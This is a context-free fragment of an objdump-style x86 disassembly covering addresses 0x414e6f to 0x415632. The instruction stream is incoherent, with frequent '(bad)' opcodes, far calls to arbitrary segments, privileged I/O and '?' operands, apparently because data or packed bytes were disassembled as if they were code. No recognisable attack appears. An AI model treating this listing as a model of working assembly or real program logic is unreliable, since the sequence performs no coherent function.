  414e6f:	imul   BYTE PTR [ebp+0x1e]
  414e72:	xlat   BYTE PTR ds:[ebx]
  414e73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e74:	cli    
  414e75:	add    al,0x4f
  414e77:	cwde   
  414e78:	pop    edi
  414e79:	ret    
  414e7a:	pusha  
  414e7b:	push   ss
  414e7c:	popa   
  414e7d:	nop
  414e7e:	ins    BYTE PTR es:[edi],dx
  414e7f:	loope  0x414e53
  414e81:	loopne 0x414e49
  414e83:	fsubr  st(2),st
  414e85:	mov    ds:0x43ea017b,eax
  414e8a:	rcl    BYTE PTR [edi-0x68],cl
  414e8d:	leave  
  414e8e:	cmp    ebp,DWORD PTR [esi-0x2d9bd873]
  414e94:	sbb    dl,ch
  414e96:	pop    edx
  414e97:	mov    esi,0x6fb394b9
  414e9c:	aam    0x7d
  414e9e:	loop   0x414e3e
  414ea0:	sbb    dl,BYTE PTR [ecx-0x47]
  414ea3:	mov    eax,0x244f950
  414ea8:	inc    ebp
  414ea9:	ret    0x2a80
  414eac:	jae    0x414e34
  414eae:	push   ecx
  414eaf:	cmp    bh,BYTE PTR [ecx-0x55729cc3]
  414eb5:	pusha  
  414eb6:	push   esp
  414eb7:	sahf   
  414eb8:	pop    esi
  414eb9:	xchg   edi,eax
  414eba:	push   ecx
  414ebb:	jb     0x414f32
  414ebd:	adc    al,0xa2
  414ebf:	mov    esi,0x292851cb
  414ec4:	lods   al,BYTE PTR ds:[esi]
  414ec5:	neg    BYTE PTR [edi]
  414ec7:	push   esi
  414ec8:	dec    ebp
  414ec9:	inc    edi
  414eca:	xchg   ebp,eax
  414ecb:	loope  0x414f06
  414ecd:	aaa    
  414ece:	inc    eax
  414ecf:	sahf   
  414ed0:	jg     0x414f33
  414ed2:	push   cs
  414ed3:	adc    DWORD PTR [esi+0x3c9bab90],ebp
  414ed9:	mov    edi,0x5a4d100a
  414ede:	push   eax
  414edf:	dec    esp
  414ee0:	dec    esp
  414ee1:	jl     0x414f40
  414ee3:	mov    ds:0xc462fcb6,eax
  414ee8:	mov    ebx,0x64f36f86
  414eed:	out    dx,al
  414eee:	dec    esp
  414eef:	dec    ebx
  414ef0:	xor    eax,0xdde917d8
  414ef5:	arpl   bx,di
  414ef7:	push   esp
  414ef8:	pop    ecx
  414ef9:	sti    
  414efa:	daa    
  414efb:	pop    esi
  414efc:	std    
  414efd:	sub    DWORD PTR [ebp-0x667853bd],eax
  414f03:	ins    DWORD PTR es:[edi],dx
  414f04:	fsubp  st(7),st
  414f06:	xor    eax,0x264fbe54
  414f0b:	push   esp
  414f0c:	jb     0x414f62
  414f0e:	dec    ebx
  414f0f:	inc    edi
  414f10:	(bad)
  414f14:	ja     0x414f2b
  414f16:	dec    edx
  414f17:	je     0x414f04
  414f19:	add    eax,0x4670ef01
  414f1e:	jle    0x414f9d
  414f20:	mov    bl,cl
  414f22:	into   
  414f23:	call   0x1302:0xf1da477d
  414f2a:	or     eax,esp
  414f2c:	mov    edi,0x616f7434
  414f31:	sub    bh,BYTE PTR [edi]
  414f33:	call   0x28c2:0xb6fde5a5
  414f3a:	rcr    DWORD PTR [esi],0x3f
  414f3d:	jo     0x414f07
  414f3f:	pop    ss
  414f40:	mov    eax,0x89d0741e
  414f45:	je     0x414f85
  414f47:	dec    edx
  414f48:	and    ebx,edx
  414f4a:	mov    esi,0x3da78eb6
  414f4f:	cmp    cl,ah
  414f51:	pop    esp
  414f52:	jmp    FWORD PTR [ecx-0x40]
  414f55:	mov    gs,WORD PTR [eax+0x19]
  414f58:	mov    ss,WORD PTR [eax-0x1c]
  414f5b:	pop    ss
  414f5c:	(bad)  
  414f5d:	shr    dh,0xae
  414f60:	dec    eax
  414f61:	sub    eax,0xf0fd172d
  414f66:	rcl    esi,0x6f
  414f69:	mul    DWORD PTR [eax-0xb]
  414f6c:	adc    eax,0x8aa86ec
  414f71:	xchg   esi,eax
  414f72:	test   bl,0xdc
  414f75:	jnp    0x414fc1
  414f77:	jg     0x414fec
  414f79:	ffreep st(2)
  414f7b:	xor    al,0x64
  414f7d:	std    
  414f7e:	xor    eax,0x2ab7dee1
  414f83:	xlat   BYTE PTR ds:[ebx]
  414f84:	repnz adc esi,DWORD PTR [edi]
  414f87:	sahf   
  414f88:	les    ebp,FWORD PTR [ecx+0x32b730eb]
  414f8e:	call   0xc525:0x17ae7453
  414f95:	fadd   DWORD PTR [ecx+0x3e]
  414f98:	arpl   WORD PTR [ecx],di
  414f9a:	xor    al,0x4a
  414f9c:	fmul   QWORD PTR [edx+0x66078887]
  414fa2:	adc    bl,BYTE PTR [ecx+eiz*8+0x126be2ad]
  414fa9:	fidivr DWORD PTR [ebx]
  414fab:	lods   al,BYTE PTR ds:[esi]
  414fac:	jnp    0x414f4f
  414fae:	jbe    0x414f89
  414fb0:	loope  0x414f32
  414fb2:	daa    
  414fb3:	cli    
  414fb4:	cld    
  414fb5:	cmp    ebp,DWORD PTR [ebx+0x66]
  414fb8:	cmp    si,bx
  414fbb:	lock jecxz 0x414fdf
  414fbe:	mov    ch,0xe0
  414fc0:	sbb    eax,0xb301c746
  414fc5:	xor    eax,0x932c7fc7
  414fca:	push   ecx
  414fcb:	out    0xb0,al
  414fcd:	adc    dl,BYTE PTR [edx-0x40]
  414fd0:	jo     0x414f64
  414fd2:	push   0x64
  414fd4:	stc    
  414fd5:	hlt    
  414fd6:	inc    ebx
  414fd7:	imul   BYTE PTR [esi-0x7d47bee8]
  414fdd:	sub    al,0xc8
  414fdf:	fisubr WORD PTR [ebp+0x2e]
  414fe2:	lock dec ecx
  414fe4:	adc    DWORD PTR [ebx-0x2d7e8dc4],ecx
  414fea:	scas   al,BYTE PTR es:[edi]
  414feb:	mov    ss,WORD PTR [eax]
  414fed:	sbb    al,0xdd
  414fef:	cmp    dl,al
  414ff1:	mov    al,0xfd
  414ff3:	pop    edx
  414ff4:	adc    esi,DWORD PTR [eax]
  414ff6:	jg     0x414f7a
  414ff8:	mov    BYTE PTR [edx+0x43f6887b],ch
  414ffe:	adc    esi,eax
  415000:	call   0x6f0e:0x5206bef1
  415007:	mov    WORD PTR [edx],es
  415009:	mov    ch,0x62
  41500b:	cs ja  0x415071
  41500e:	es push ebx
  415010:	stc    
  415011:	ret    
  415012:	mov    ds:0xaa92cefa,eax
  415017:	addr16 js 0x41502f
  41501a:	mov    dh,0x70
  41501c:	inc    ebp
  41501d:	dec    edi
  41501e:	stc    
  41501f:	popf   
  415020:	jecxz  0x414fb1
  415022:	ins    DWORD PTR es:[edi],dx
  415023:	pop    esp
  415024:	daa    
  415025:	je     0x415081
  415027:	aam    0x65
  415029:	jmp    0x415099
  41502b:	outs   dx,BYTE PTR ds:[esi]
  41502c:	pop    esi
  41502d:	xchg   edx,eax
  41502e:	(bad)  
  41502f:	mov    eax,ds:0xa6a3c810
  415034:	lea    esp,[ecx+0x15af58e8]
  41503a:	mov    ebp,0xbe206207
  41503f:	push   es
  415040:	sbb    al,BYTE PTR [ebx+0x62]
  415043:	mov    ebp,0x7bba3a11
  415048:	xor    al,0xb
  41504a:	outs   dx,DWORD PTR ds:[esi]
  41504b:	pop    eax
  41504c:	xchg   ebp,eax
  41504d:	adc    BYTE PTR [ebx-0x142e5b65],cl
  415053:	nop
  415054:	adc    edx,DWORD PTR [ecx+0x44]
  415057:	mov    cl,0xe6
  415059:	es add eax,0xf503adaf
  41505f:	inc    edx
  415060:	sbb    al,BYTE PTR [ebx-0x53d0826]
  415066:	addr16 out 0x2a,al
  415069:	loope  0x41508d
  41506b:	mov    WORD PTR [edi-0xf07d028],es
  415071:	pop    edx
  415072:	loopne 0x4150c6
  415074:	mov    bh,0x5
  415076:	jge    0x4150dd
  415078:	fcmovb st,st(7)
  41507a:	test   eax,0xab2a5d9b
  41507f:	les    esi,FWORD PTR [ebx-0x78]
  415082:	cmp    DWORD PTR [eax-0x7a28777f],edx
  415088:	lods   eax,DWORD PTR ds:[esi]
  415089:	inc    esp
  41508a:	iret   
  41508b:	pop    esi
  41508c:	xchg   edi,eax
  41508d:	mov    al,0x9c
  41508f:	les    ebp,FWORD PTR [ebp+eiz*1-0x56]
  415093:	sbb    ch,dh
  415095:	rcl    esp,0xab
  415098:	cmp    eax,0x10f6c46e
  41509d:	push   0xffffffdb
  41509f:	in     al,dx
  4150a0:	xchg   esp,eax
  4150a1:	inc    eax
  4150a2:	out    dx,al
  4150a3:	adc    bl,dh
  4150a5:	jae    0x41508b
  4150a7:	(bad)  
  4150a8:	in     eax,dx
  4150a9:	int    0xa0
  4150ab:	dec    esp
  4150ac:	out    dx,al
  4150ad:	or     ch,ah
  4150af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150b0:	test   BYTE PTR [esi],cl
  4150b2:	inc    edx
  4150b3:	jo     0x415095
  4150b5:	sub    eax,0xabf9ba4c
  4150ba:	inc    esi
  4150bb:	jno    0x415101
  4150bd:	outs   dx,BYTE PTR ds:[esi]
  4150be:	(bad)  
  4150bf:	fadd   st,st(6)
  4150c1:	pop    edi
  4150c2:	inc    ecx
  4150c3:	add    BYTE PTR [edi+0x32],dh
  4150c6:	inc    ebp
  4150c7:	push   edi
  4150c8:	fdivrp st(3),st
  4150ca:	pop    ebx
  4150cb:	add    eax,0xc3e8036c
  4150d0:	cdq    
  4150d1:	pop    esp
  4150d2:	jecxz  0x4150c1
  4150d4:	adc    al,BYTE PTR [bx-0x16]
  4150d8:	pusha  
  4150d9:	in     eax,dx
  4150da:	mov    esi,DWORD PTR [edi]
  4150dc:	gs jmp 0x41507d
  4150df:	jmp    0x415151
  4150e1:	jno    0x415162
  4150e3:	xchg   DWORD PTR [ebx-0x43],esi
  4150e6:	jp     0x41515a
  4150e8:	sti    
  4150e9:	scas   eax,DWORD PTR es:[edi]
  4150ea:	jo     0x415161
  4150ec:	cld    
  4150ed:	mov    ah,0x56
  4150ef:	cdq    
  4150f0:	jne    0x415099
  4150f2:	sub    dl,BYTE PTR [eax]
  4150f4:	fcmovu st,st(3)
  4150f6:	push   ss
  4150f7:	call   0x9bf1:0x2a86c274
  4150fe:	mov    ds:0x7907ab91,al
  415103:	in     eax,0x5c
  415105:	aaa    
  415106:	lds    ebp,FWORD PTR [esi-0x1535fd25]
  41510c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41510d:	cmp    eax,0x2afc70d1
  415112:	adc    edx,DWORD PTR [eax]
  415114:	loopne 0x415105
  415116:	test   al,0x4d
  415118:	mov    ds:0x5585a458,eax
  41511d:	pop    edi
  41511e:	icebp  
  41511f:	pop    ebp
  415120:	push   0xffffffa6
  415122:	repnz rcr DWORD PTR [ebx+0x6a74b8fe],1
  415129:	xchg   edx,eax
  41512a:	push   ebx
  41512b:	mov    al,0x51
  41512d:	loopne 0x415112
  41512f:	dec    ecx
  415130:	adc    DWORD PTR [edi+0x7e],0x14eb0a04
  415137:	add    al,0x7c
  415139:	sbb    DWORD PTR [esi],esp
  41513b:	inc    ebp
  41513c:	add    DWORD PTR [ecx+0xdfe1b7c],ebp
  415142:	ret    0x7cf1
  415145:	cwde   
  415146:	pop    esi
  415147:	or     cl,0x37
  41514a:	(bad)  
  41514b:	call   0x45a6:0x1d5a059e
  415152:	arpl   ax,ax
  415154:	cmp    edi,edi
  415156:	jmp    0x4151ae
  415158:	aad    0x60
  41515a:	xor    BYTE PTR [edi+0x5b],0x45
  41515e:	lahf   
  41515f:	ret    0x7853
  415162:	xchg   ecx,eax
  415163:	sbb    dl,ah
  415165:	dec    ebp
  415166:	test   ebx,ebx
  415168:	sar    DWORD PTR [eax-0x77],cl
  41516b:	add    edx,ebx
  41516d:	inc    esp
  41516e:	fiadd  DWORD PTR es:0xf2c35ff
  415175:	cmp    eax,0xa48ae035
  41517a:	cmp    BYTE PTR [ebp+0x3c382941],bh
  415180:	out    0x31,eax
  415182:	loope  0x4151cf
  415184:	xchg   edx,eax
  415185:	inc    esp
  415186:	dec    edx
  415187:	ret    
  415188:	cli    
  415189:	out    dx,al
  41518a:	fist   WORD PTR [ecx-0x66]
  41518d:	(bad)  
  41518e:	adc    eax,0x50fe745c
  415193:	stc    
  415194:	xchg   edx,eax
  415195:	jns    0x41513a
  415197:	in     eax,dx
  415198:	and    ebx,DWORD PTR [ebx-0x17]
  41519b:	pop    esp
  41519c:	(bad)  
  41519d:	rcl    BYTE PTR [edi-0x61],cl
  4151a0:	or     DWORD PTR [esi+ebx*4+0x67],esi
  4151a4:	or     eax,0x8732a202
  4151a9:	push   cs
  4151aa:	fimul  WORD PTR [esi]
  4151ac:	push   ss
  4151ad:	inc    esi
  4151ae:	push   ebx
  4151af:	(bad)  
  4151b0:	ficomp WORD PTR [esi]
  4151b2:	push   eax
  4151b3:	scas   al,BYTE PTR es:[edi]
  4151b4:	or     bh,BYTE PTR [edx]
  4151b6:	sub    eax,0x988414c2
  4151bb:	loop   0x41518c
  4151bd:	fmul   QWORD PTR [edx+esi*1+0x4f16ca85]
  4151c4:	outs   dx,DWORD PTR ds:[esi]
  4151c5:	(bad)  
  4151c8:	addr16 push ss
  4151ca:	cld    
  4151cb:	pop    ebx
  4151cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151cd:	and    al,0x28
  4151cf:	(bad)
  4151d3:	dec    esp
  4151d4:	add    al,0xfc
  4151d6:	retf   
  4151d7:	pop    ss
  4151d8:	mov    eax,ds:0x8299d930
  4151dd:	je     0x415181
  4151df:	test   DWORD PTR [ecx],eax
  4151e1:	aam    0xdf
  4151e3:	push   edx
  4151e4:	xor    BYTE PTR [eax],cl
  4151e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151e7:	rcr    esp,cl
  4151e9:	mov    al,0x7c
  4151eb:	mov    ah,0xbc
  4151ed:	cmp    dh,dl
  4151ef:	test   DWORD PTR [ebp+0x75a1d667],eax
  4151f5:	push   es
  4151f6:	cmp    dl,BYTE PTR [edx]
  4151f8:	test   BYTE PTR [edi-0x739eac6a],dl
  4151fe:	or     ecx,DWORD PTR [edi-0x684df33e]
  415204:	sahf   
  415205:	(bad)  
  415206:	(bad)  
  415207:	jnp    0x415282
  415209:	mov    al,0x57
  41520b:	inc    ecx
  41520c:	scas   eax,DWORD PTR es:[edi]
  41520d:	call   0x6b2b:0xa4249ac6
  415214:	jge    0x41526f
  415216:	retf   0x14dd
  415219:	sub    eax,0x302a2bca
  41521e:	xchg   esp,eax
  41521f:	jae    0x415252
  415221:	aam    0x7c
  415223:	repz cli 
  415225:	pop    ebx
  415226:	xor    BYTE PTR [ebp-0x5b],dl
  415229:	inc    ch
  41522b:	sti    
  41522c:	test   BYTE PTR ds:0xb67d73c8,al
  415232:	lea    edi,[esi]
  415234:	push   ebx
  415235:	cmp    esi,DWORD PTR [ecx-0x177b8ffc]
  41523b:	(bad)  
  41523c:	iret   
  41523d:	mov    al,ds:0x2297c789
  415242:	mov    ebx,0x45f3fbf6
  415247:	jae    0x415207
  415249:	mov    edx,0x9dd2b554
  41524e:	mov    esi,0x67e02f4a
  415253:	js     0x4152b2
  415255:	jb     0x41521d
  415257:	jge    0x4152d5
  415259:	jl     0x4151ee
  41525b:	ret    0xb4a5
  41525e:	stos   BYTE PTR es:[edi],al
  41525f:	pop    ebp
  415260:	dec    esi
  415261:	jmp    0xb854:0xb3a4d41
  415268:	out    0x59,al
  41526a:	ror    BYTE PTR [ebx+0x54],0xe6
  41526e:	pop    es
  41526f:	les    esi,FWORD PTR [ebp+0x1737035f]
  415275:	cdq    
  415276:	cs jmp 0x4151fd
  415279:	(bad)  
  41527a:	mov    ebx,0x4499a958
  41527f:	mov    ch,0xd
  415281:	pop    esi
  415282:	push   0xffffff81
  415284:	scas   al,BYTE PTR es:[edi]
  415285:	mov    bh,0xd3
  415287:	mov    ds:0x26e47626,al
  41528c:	dec    ebp
  41528d:	pusha  
  41528e:	push   0xf010023f
  415293:	mov    ch,0xc
  415295:	shl    BYTE PTR ds:0x93388992,1
  41529b:	xchg   edi,eax
  41529c:	outs   dx,BYTE PTR ds:[esi]
  41529d:	ins    BYTE PTR es:[edi],dx
  41529e:	retf   0x6036
  4152a1:	xor    ecx,DWORD PTR [edx-0x46]
  4152a4:	sub    eax,0x7f54d216
  4152a9:	and    BYTE PTR [esi+ecx*2],al
  4152ac:	adc    DWORD PTR [edi],esp
  4152ae:	mul    BYTE PTR [ebx+0x3a]
  4152b1:	xchg   ebx,eax
  4152b2:	dec    ecx
  4152b3:	into   
  4152b4:	sub    dl,BYTE PTR [eax+0x4a]
  4152b7:	adc    al,0x54
  4152b9:	call   0xf7:0xe170aff8
  4152c0:	cmc    
  4152c1:	mov    ebp,0xdc02606b
  4152c6:	sub    bl,BYTE PTR [edi+0x30]
  4152c9:	pusha  
  4152ca:	in     eax,dx
  4152cb:	rcl    DWORD PTR [esi+0x59],cl
  4152ce:	and    al,0x38
  4152d1:	xchg   esp,eax
  4152d2:	sbb    eax,DWORD PTR [ebp-0xf]
  4152d5:	dec    ebp
  4152d6:	dec    edx
  4152d7:	in     eax,dx
  4152d8:	rol    BYTE PTR [edx],0xb1
  4152db:	in     eax,dx
  4152dc:	mov    cs,WORD PTR [ebp+0x599cf557]
  4152e2:	adc    eax,DWORD PTR [edx+eiz*8-0x95fa3ae]
  4152e9:	fidivr WORD PTR [eax+0xe6c1eec]
  4152ef:	cmp    edx,eax
  4152f1:	retf   0x5fbf
  4152f4:	adc    dl,0x4c
  4152f7:	pop    ebx
  4152f8:	test   BYTE PTR [esi],0x21
  4152fb:	and    edx,DWORD PTR [edx]
  4152fd:	(bad)  
  4152ff:	ror    DWORD PTR [ecx-0x15e68959],0xf5
  415306:	xchg   ebp,eax
  415307:	aam    0xd8
  415309:	fld    TBYTE PTR [edi]
  41530b:	mov    gs,WORD PTR [esi]
  41530d:	fwait
  41530e:	cmc    
  41530f:	lea    esi,[ecx]
  415311:	ret    0x1f1b
  415314:	xor    esi,0x3a
  415317:	push   ds
  415318:	out    0xc2,eax
  41531a:	pusha  
  41531b:	aam    0xb9
  41531d:	cmp    al,0x52
  41531f:	sub    bl,BYTE PTR [esi+0xb]
  415322:	lods   al,BYTE PTR ds:[esi]
  415323:	cmp    edx,DWORD PTR [ebx]
  415325:	pop    esi
  415326:	test   al,0x15
  415328:	imul   edi,DWORD PTR [esi],0x76929e72
  41532e:	pop    edi
  41532f:	mov    al,BYTE PTR [eax+0x3b]
  415332:	ret    0xc497
  415335:	aas    
  415336:	bound  edx,QWORD PTR ds:0x7a0de323
  41533c:	mov    dl,0x51
  41533e:	sti    
  41533f:	std    
  415340:	cmp    esi,esi
  415342:	pop    edx
  415343:	xchg   ebx,eax
  415344:	dec    ecx
  415345:	xchg   ebp,eax
  415346:	and    al,ch
  415348:	mov    esp,0xf20611e1
  41534d:	test   DWORD PTR [ecx-0x71cbbebc],0xbc347ae0
  415357:	sti    
  415358:	fbld   TBYTE PTR [ecx+ecx*4]
  41535b:	push   cs
  41535c:	xchg   esi,eax
  41535d:	xor    ah,BYTE PTR [ebx-0x48]
  415360:	rcr    DWORD PTR [edx-0x7f],1
  415363:	lods   al,BYTE PTR ds:[esi]
  415364:	inc    ebx
  415365:	call   0xd48d1a2
  41536a:	sbb    eax,0xefe22897
  415370:	lds    esp,FWORD PTR [eax+0x572f2f6e]
  415376:	sub    ebx,DWORD PTR [edx+0x621a0730]
  41537c:	retf   0x2cb4
  41537f:	stc    
  415380:	add    al,0xaf
  415382:	shl    DWORD PTR ds:0xcdfb51b6,0xbd
  415389:	shr    BYTE PTR [edi-0x7],cl
  41538c:	xchg   edx,eax
  41538d:	inc    esp
  41538e:	sahf   
  41538f:	cmc    
  415390:	mov    edx,0x41365a08
  415395:	cmp    eax,0x6ad97e1a
  41539a:	sbb    eax,0x73a2604c
  41539f:	jne    0x4153c1
  4153a1:	xchg   ecx,eax
  4153a2:	leave  
  4153a3:	scas   eax,DWORD PTR es:[edi]
  4153a4:	fwait
  4153a5:	mov    eax,0x6b7a6ad4
  4153aa:	mov    esp,ss
  4153ac:	scas   eax,DWORD PTR es:[edi]
  4153ad:	repz test BYTE PTR [edi+eax*8-0xfa6a252],dl
  4153b5:	push   ecx
  4153b6:	xor    bl,BYTE PTR ds:0xe3b4bb64
  4153bc:	push   edx
  4153bd:	(bad)  
  4153be:	(bad)  
  4153bf:	je     0x415409
  4153c1:	or     BYTE PTR [edi-0x5f2a25ab],0x7
  4153c8:	out    0x36,al
  4153ca:	pop    ds
  4153cb:	scas   al,BYTE PTR es:[edi]
  4153cc:	not    DWORD PTR [esi]
  4153ce:	sub    eax,0x1dd9c951
  4153d3:	or     ebx,ecx
  4153d5:	jbe    0x4153a5
  4153d7:	bound  edi,QWORD PTR [edx+0x6ee88831]
  4153dd:	int3   
  4153de:	sbb    DWORD PTR [ecx+eiz*2],ebx
  4153e1:	imul   edi,DWORD PTR [ebp+0x393fb68d],0x41
  4153e8:	into   
  4153e9:	xor    BYTE PTR ds:0xd7e6cb72,0x31
  4153f0:	in     al,dx
  4153f1:	mov    WORD PTR [edx],?
  4153f3:	pop    edx
  4153f4:	xchg   esi,eax
  4153f5:	pop    eax
  4153f6:	repnz add DWORD PTR [edi+0x3fc6aa5f],esi
  4153fd:	add    cl,bh
  4153ff:	fist   DWORD PTR [esi]
  415401:	sbb    BYTE PTR [ecx+0x5964c39d],bh
  415407:	mov    edi,DWORD PTR [ebp-0x5b2fbc19]
  41540d:	scas   eax,DWORD PTR es:[edi]
  41540e:	popf   
  41540f:	inc    esi
  415410:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415411:	or     DWORD PTR [edi+0x5a],esi
  415414:	inc    eax
  415415:	fucom  st(7)
  415417:	inc    esp
  415418:	fwait
  415419:	xchg   edx,eax
  41541a:	push   es
  41541b:	test   ax,0x750a
  41541f:	(bad)  
  415420:	aam    0xe3
  415422:	dec    edi
  415423:	inc    esi
  415424:	ret    
  415425:	cmp    eax,0xe253c1b8
  41542a:	mov    ?,WORD PTR [edi]
  41542c:	gs adc dh,bh
  41542f:	imul   edx,DWORD PTR [esi-0x32],0x4d893aad
  415436:	jecxz  0x415440
  415438:	mov    ecx,0x5d4e8d98
  41543d:	jno    0x4153d4
  41543f:	or     esi,esp
  415441:	fisub  DWORD PTR [edi-0x5fb8ecfb]
  415447:	retf   
  415448:	jne    0x4154a9
  41544a:	stos   BYTE PTR es:[edi],al
  41544b:	inc    ebp
  41544c:	dec    edi
  41544d:	inc    edi
  41544e:	and    eax,0x6f28e204
  415454:	sbb    al,0xaf
  415456:	mov    al,0xb1
  415458:	push   ds
  415459:	or     al,0xd
  41545b:	inc    esp
  41545c:	jns    0x41540b
  41545e:	mov    cs:0xc304a27f,eax
  415464:	sar    dl,cl
  415466:	call   0x7548fb5b
  41546b:	mov    eax,0xc90a0720
  415470:	(bad)  
  415471:	pop    esp
  415472:	es push ds
  415474:	lahf   
  415475:	push   ebp
  415476:	lahf   
  415477:	sub    eax,0xbf50ab43
  41547c:	fs rdpmc 
  41547f:	test   BYTE PTR [eax+0x24],bl
  415482:	mov    ch,0x74
  415484:	aad    0x1
  415486:	jge    0x4154bd
  415488:	pop    esi
  415489:	ins    DWORD PTR es:[edi],dx
  41548a:	aas    
  41548b:	jb     0x4154cf
  41548d:	dec    ebp
  41548e:	adc    eax,0xa597ac25
  415493:	rol    DWORD PTR [ebp-0x10],cl
  415496:	push   ds
  415497:	inc    ecx
  415498:	xchg   ecx,eax
  415499:	pop    edx
  41549a:	inc    esi
  41549b:	adc    eax,0xfebb1fd8
  4154a0:	or     al,0xa0
  4154a2:	jmp    0xb079:0x4dce4f9e
  4154a9:	ds popa 
  4154ab:	adc    al,0x52
  4154ad:	(bad)  
  4154ae:	ret    
  4154af:	pop    edx
  4154b0:	ds add al,0x22
  4154b3:	sbb    DWORD PTR [eax],eax
  4154b5:	jg     0x415441
  4154b7:	call   0x32b1:0xb2c9beb4
  4154be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154bf:	mov    ah,0x1c
  4154c1:	sub    ecx,edx
  4154c3:	ror    BYTE PTR [edx-0x2],1
  4154c6:	es dec edi
  4154c8:	sbb    edi,esi
  4154ca:	or     ebp,DWORD PTR [edi]
  4154cc:	mov    esi,0xf387f36d
  4154d1:	sbb    DWORD PTR [edx+0x75a0bee8],0xffffffbf
  4154d8:	aaa    
  4154d9:	push   0x40e0b441
  4154de:	mov    dh,0xd9
  4154e0:	and    edi,esi
  4154e2:	fdivr  DWORD PTR [eax]
  4154e4:	push   ss
  4154e5:	sbb    BYTE PTR [eax+0x4a],bh
  4154e8:	inc    edx
  4154e9:	pop    ebp
  4154ea:	adc    al,0xf2
  4154ec:	js     0x4154ee
  4154ee:	pop    ebp
  4154ef:	dec    esi
  4154f0:	and    edi,DWORD PTR [edi-0x2c]
  4154f3:	mov    ebp,0xbbd4bced
  4154f8:	lds    esi,FWORD PTR [ecx]
  4154fa:	pop    edi
  4154fb:	jne    0x41554f
  4154fd:	imul   edi,DWORD PTR [edx],0x69
  415500:	out    0x7,eax
  415502:	push   esi
  415503:	push   0x41
  415505:	jle    0x41556d
  415507:	lods   al,BYTE PTR ds:[esi]
  415508:	and    esi,ecx
  41550a:	xchg   ecx,eax
  41550b:	xchg   ebx,eax
  41550c:	rcl    BYTE PTR [ecx+0x35],cl
  41550f:	in     eax,dx
  415510:	das    
  415511:	fadd   st,st(0)
  415513:	mov    ecx,esp
  415515:	(bad)  
  415516:	xchg   edx,eax
  415517:	pop    ss
  415518:	mov    cl,0xe7
  41551a:	lock add bl,cl
  41551d:	fild   WORD PTR [ebp-0x1530aa66]
  415523:	jns    0x4154e2
  415525:	jecxz  0x4154f3
  415527:	call   0x6ec3:0x48126dfc
  41552e:	fld    QWORD PTR [ecx]
  415530:	ror    BYTE PTR [esi+0x23c54afa],cl
  415536:	sbb    DWORD PTR [edx-0x5a],ecx
  415539:	jl     0x4155b2
  41553b:	int3   
  41553c:	mov    cl,0x7b
  41553e:	(bad)  
  415540:	icebp  
  415541:	test   al,0x62
  415543:	mov    ecx,DWORD PTR [esi-0x17]
  415546:	sub    eax,0x174f36b3
  41554b:	mov    bh,0xef
  41554d:	add    al,0x41
  41554f:	repz icebp 
  415551:	fadd   QWORD PTR [edi]
  415553:	sbb    eax,0x73f3ae75
  415558:	dec    eax
  415559:	fldcw  WORD PTR [bx]
  41555c:	addr16 sbb al,0xd
  41555f:	fld    st(5)
  415561:	fchs   
  415563:	das    
  415564:	jle    0x41554f
  415566:	test   BYTE PTR [edi],bh
  415568:	std    
  415569:	sub    ebp,DWORD PTR [ebx+0x10]
  41556c:	push   ss
  41556d:	pop    eax
  41556e:	retf   
  41556f:	out    0x41,eax
  415571:	inc    eax
  415572:	ret    0xf164
  415575:	sbb    eax,0x441f6025
  41557a:	sahf   
  41557b:	int    0x71
  41557d:	ins    DWORD PTR es:[edi],dx
  41557e:	icebp  
  41557f:	ret    0x6be
  415582:	std    
  415583:	adc    cl,cl
  415585:	xor    ah,0x3
  415588:	loopne 0x415538
  41558a:	pop    ebp
  41558b:	jb     0x415517
  41558d:	hlt    
  41558e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41558f:	hlt    
  415590:	pop    DWORD PTR [eax-0x799bdfbf]
  415596:	fwait
  415597:	and    ebx,DWORD PTR fs:[edi+edx*8+0x6c4a6ccf]
  41559f:	push   edi
  4155a0:	or     DWORD PTR [eax+esi*4-0x29],ebx
  4155a4:	retf   
  4155a5:	jl     0x4155f6
  4155a7:	or     DWORD PTR [eax],0xf39dea12
  4155ad:	(bad)  
  4155ae:	lods   al,BYTE PTR ds:[esi]
  4155af:	stc    
  4155b0:	xchg   ebx,eax
  4155b1:	loop   0x4155c2
  4155b3:	dec    ebp
  4155b4:	xor    al,0x33
  4155b6:	idiv   DWORD PTR [ebp+0x39]
  4155b9:	push   ebp
  4155ba:	sbb    ebp,DWORD PTR [edi-0x29d3d59e]
  4155c0:	xor    DWORD PTR [esi],ebx
  4155c2:	and    DWORD PTR [esi+0xb37162f],ecx
  4155c8:	arpl   WORD PTR [ebp+0x38],si
  4155cb:	lahf   
  4155cc:	and    DWORD PTR [eax],ebp
  4155ce:	retf   
  4155cf:	frstor [ebx]
  4155d1:	xchg   ebp,eax
  4155d2:	pop    eax
  4155d3:	sub    ebp,DWORD PTR [ecx+0x1db423b4]
  4155d9:	mov    bh,0x65
  4155db:	jg     0x41561a
  4155dd:	or     eax,0xac166969
  4155e2:	add    DWORD PTR [edi],ebp
  4155e4:	out    0x30,eax
  4155e6:	mov    WORD PTR [ebx-0x18ed4a63],fs
  4155ec:	mov    gs,WORD PTR [eax]
  4155ee:	add    al,0xeb
  4155f0:	pop    eax
  4155f1:	in     eax,dx
  4155f2:	int    0xcb
  4155f4:	lods   eax,DWORD PTR ds:[esi]
  4155f5:	push   eax
  4155f6:	adc    eax,0x130da347
  4155fb:	mov    esi,0xf120ded0
  415600:	sbb    al,0xe1
  415602:	into   
  415603:	mov    BYTE PTR [esi],dl
  415605:	jmp    0xb408:0x1cf0c646
  41560c:	dec    edi
  41560d:	pop    ss
  41560e:	icebp  
  41560f:	sbb    eax,0x9eb7b8f
  415614:	jno    0x415652
  415616:	or     eax,0x927604ab
  41561b:	mov    BYTE PTR [edi-0x30],ch
  41561e:	gs icebp 
  415620:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415621:	jnp    0x4155bc
  415623:	jmp    DWORD PTR [ebp-0x7a]
  415626:	jno    0x41562d
  415628:	stos   DWORD PTR es:[edi],eax
  415629:	or     ch,BYTE PTR [ebx]
  41562b:	jbe    0x41562a
  41562d:	mov    al,ds:0xc7742d44
  415632:	pop    edi
